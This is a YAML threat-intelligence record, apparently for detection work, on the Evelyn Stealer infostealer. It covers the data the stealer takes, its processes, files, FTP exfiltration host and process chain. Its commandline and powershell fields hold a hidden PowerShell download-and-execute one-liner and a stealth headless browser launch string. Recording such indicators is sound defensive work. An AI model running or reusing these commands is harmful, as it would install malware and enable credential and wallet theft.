description: Evelyn Stealer attempts to inject into browsers and steal various data
  including browser wallets, Telegram sessions, gaming sessions, Discord tokens, WiFi
  passwords, FileZilla data, VPN configs, clipboard contents, sensitive files, system
  info, process list, installed programs, and screenshots. It then compresses the
  stolen data and uploads it via FTP.
malware_families:
- Evelyn Stealer
TTPs:
  processes:
  - Lightshot.exe
  - grpconv.exe
  - powershell.exe
  - cmd.exe
  commandline:
  - powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://syn1112223334445556667778889990.0rg/iknowyou.model -OutFile $env:TEMP\\runtime.exe; Start-Process $env:TEMP\\runtime.exe"
  - '"grpconv.exe"'
  - '"\"%s\\\" --headless=new --disable-gpu --no-sandbox --disable-extensions --disable-software-rasterizer
    --disable-dev-shm-usage --disable-logging --silent-launch --no-first-run --no-default-browser-check
    --disable-popup-blocking --disable-background-networking --disable-sync --disable-translate
    --metrics-recording-only --mute-audio --hide-scrollbars --window-position=-10000,-10000
    --window-size=1,1 about:blank\"'
  powershell:
  - Invoke-WebRequest -Uri http://syn1112223334445556667778889990.0rg/iknowyou.model
    -OutFile $env:TEMP\\runtime.exe; Start-Process $env:TEMP\\runtime.exe
  scripting_engine: []
  registry_keys: []
  image_load:
  - kernel32.dll
  - ntdll.dll
  - InjectDLL
  network_connections:
  - grpconv.exe, server09.mentality.cloud, 21
  - server09.mentality.cloud, 21
  - servere9.mentality.cloud
  file_activity:
  - '%TEMP%\\runtime.exe'
  - '%APPDATA%\\Evelyn\\*'
  - '%TEMP%\\abe_decrypt.dll'
  - edge
  - chrome
  - brave
  - Evelyn\\Wallets
  - zip file
  persistence: []
  process_relations:
  - Lightshot.exe->powershell.exe->runtime.exe
  - runtime.exe->grpconv.exe
